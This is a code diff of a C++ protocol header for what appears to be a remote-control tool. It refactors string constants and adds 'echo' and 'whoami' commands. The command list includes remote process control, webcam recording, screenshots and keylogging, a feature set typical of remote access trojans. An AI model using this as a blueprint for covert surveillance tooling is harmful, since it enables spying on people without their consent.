@@ -8,36 +8,42 @@
 #undef ERROR
 #endif
 
+#ifdef ECHO
+#undef ECHO
+#endif
+
 namespace Protocol {
     static const std::string VERSION = "1.0";
 
     namespace TYPE {
-        static const std::string PING = "ping";
-        static const std::string PONG = "pong"; 
-        static const std::string AUTH = "auth";
-        static const std::string STATUS = "status";
-        static const std::string HEARTBEAT = "heartbeat";
-        static const std::string ERROR = "error";
-        static const std::string BROADCAST = "broadcast";
+        static constexpr const char* PING = "ping";
+        static constexpr const char* PONG = "pong"; 
+        static constexpr const char* AUTH = "auth";
+        static constexpr const char* HEARTBEAT = "heartbeat";
+        static constexpr const char* ERROR = "error";
+        static constexpr const char* BROADCAST = "broadcast";
         
         // app
-        static const std::string APP_LIST = "LISTAPP";
-        static const std::string APP_START = "STARTAPP";
-        static const std::string APP_KILL = "STOPAPP";
+        static constexpr const char* APP_LIST = "LISTAPP";
+        static constexpr const char* APP_START = "STARTAPP";
+        static constexpr const char* APP_KILL = "STOPAPP";
 
         // process
-        static const std::string PROC_LIST = "LISTPROC";
-        static const std::string PROC_START = "STARTPROC";
-        static const std::string PROC_KILL = "STOPPROC";
+        static constexpr const char* PROC_LIST = "LISTPROC";
+        static constexpr const char* PROC_START = "STARTPROC";
+        static constexpr const char* PROC_KILL = "STOPPROC";
 
-        static const std::string CAM_RECORD = "cam_record";
-        static const std::string SCREENSHOT = "SCRSHOT";
-        static const std::string START_KEYLOG = "STARTKLOG";
-        static const std::string STOP_KEYLOG = "STOPKLOG";
+        static constexpr const char* CAM_RECORD = "cam_record";
+        static constexpr const char* SCREENSHOT = "SCRSHOT";
+        static constexpr const char* START_KEYLOG = "STARTKLOG";
+        static constexpr const char* STOP_KEYLOG = "STOPKLOG";
 
         // power
-        static const std::string SHUTDOWN = "shutdown";
-        static const std::string RESTART = "restart";
+        static constexpr const char* SHUTDOWN = "shutdown";
+        static constexpr const char* RESTART = "restart";
+
+        static constexpr const char* ECHO = "echo";
+        static constexpr const char* WHOAMI = "whoami";
     }
 
     inline const std::unordered_set<std::string>& validCommands() {
@@ -45,7 +51,6 @@ namespace Protocol {
             TYPE::PING,
             TYPE::PONG,
             TYPE::AUTH,
-            TYPE::STATUS,
             TYPE::HEARTBEAT,
             TYPE::ERROR,
             TYPE::BROADCAST,
@@ -60,7 +65,10 @@ namespace Protocol {
             TYPE::CAM_RECORD,
             TYPE::SCREENSHOT,
             TYPE::START_KEYLOG,
-            TYPE::STOP_KEYLOG
+            TYPE::STOP_KEYLOG,
+
+            TYPE::ECHO,
+            TYPE::WHOAMI
         };
         
         return types;
@@ -71,9 +79,9 @@ namespace Protocol {
     }
 
     namespace ERROR {
-        static const std::string INVALID_CMD = "invalid_command";
-        static const std::string BAD_FORMAT = "bad_format";
-        static const std::string UNAUTHORIZED = "unauthorized";
-        static const std::string UNKNOWN_ERROR = "unkown_error";
+        static constexpr const char* INVALID_CMD = "invalid_command";
+        static constexpr const char* BAD_FORMAT = "bad_format";
+        static constexpr const char* UNAUTHORIZED = "unauthorized";
+        static constexpr const char* UNKNOWN_ERROR = "unkown_error";
     }
 }
